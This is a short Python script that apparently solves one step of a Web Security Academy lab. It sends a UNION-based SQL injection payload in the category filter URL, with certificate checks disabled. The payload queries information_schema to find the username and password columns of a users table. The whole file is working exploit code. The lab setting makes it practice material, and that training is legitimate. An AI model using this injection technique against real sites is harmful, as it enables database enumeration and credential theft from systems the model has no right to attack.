import requests
from bs4 import BeautifulSoup
import re

site = '0acc003004c12030d0bac91a00060023.web-security-academy.net'
user_table = 'users_qsyhrb'

s = requests.Session()

# Step 2: Find username and password columns
url = f'https://{site}/filter?category=Gifts%27%20UNION%20SELECT%20column_name,null%20FROM%20information_schema.columns%20WHERE%20table_name=%27{user_table}%27--+'
resp = s.get(url, verify=False)

soup = BeautifulSoup(resp.text, 'html.parser')

username_col = soup.find('table').find('th', text=re.compile('^username')).text
password_col = soup.find('table').find('th', text=re.compile('^password')).text

print(f"Found username column: {username_col}")
print(f"Found password column: {password_col}")
